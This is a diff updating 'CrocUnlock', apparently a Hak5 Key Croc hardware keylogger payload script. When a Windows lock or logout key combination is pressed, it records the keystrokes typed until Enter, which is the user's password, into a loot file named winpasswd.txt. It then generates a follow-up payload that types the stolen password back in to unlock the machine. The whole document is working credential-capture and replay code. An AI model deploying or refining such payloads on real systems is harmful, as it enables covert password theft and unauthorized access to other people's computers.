@@ -1,18 +1,17 @@
 # Title:           CrocUnlock   
 # Description:     Log into windows pc
-# Author:          spywill / RootJunky
-# Version:         1.2
+# Author:          RootJunky / Spywill
+# Version:         1.4
 # Category:        Key Croc
 #
 #
-MATCH GUI-l
+MATCH (GUI-l|CONTROL-ALT-DELETE|ALT-F4)
+rm -f root/udisk/payloads/Croc_unlock_2.txt
 LED ATTACK
-rm -f -r root/udisk/payloads/Croc_unlock_2.txt root/udisk/loot/Croc_unlock.txt 
 sleep 2
 echo \M\A\T\C\H crocunlock >> /root/udisk/payloads/Croc_unlock_2.txt
-echo -e "LED ATTACK\nQ CONTROL-SHIFT-LEFTARROW\nQ DELETE\nQ STRING \"\$(sed '\$!d' root/udisk/loot/Croc_unlock.txt.filtered)\"\nQ ENTER\nLED FINISH\nsleep 2\nLED OFF" >> /root/udisk/payloads/Croc_unlock_2.txt
-sleep 2
-SAVEKEYS /root/udisk/loot/Croc_unlock.txt UNTIL ENTER
+echo -e "cat /root/udisk/loot/Croc_unlock.txt.filtered >> /root/udisk/loot/winpasswd.txt\nLED ATTACK\nQ CONTROL-SHIFT-LEFTARROW\nQ DELETE\nQ STRING \"\$(sed '\$!d' /root/udisk/loot/winpasswd.txt)\"\nQ ENTER\nsleep 1\nrm -f -r root/udisk/loot/Croc_unlock.txt /root/udisk/loot/Croc_unlock.txt.filtered\nLED FINISH\nsleep 2\nLED OFF" >> /root/udisk/payloads/Croc_unlock_2.txt
 LED FINISH
 sleep 2
 LED OFF
+SAVEKEYS /root/udisk/loot/Croc_unlock.txt UNTIL ENTER
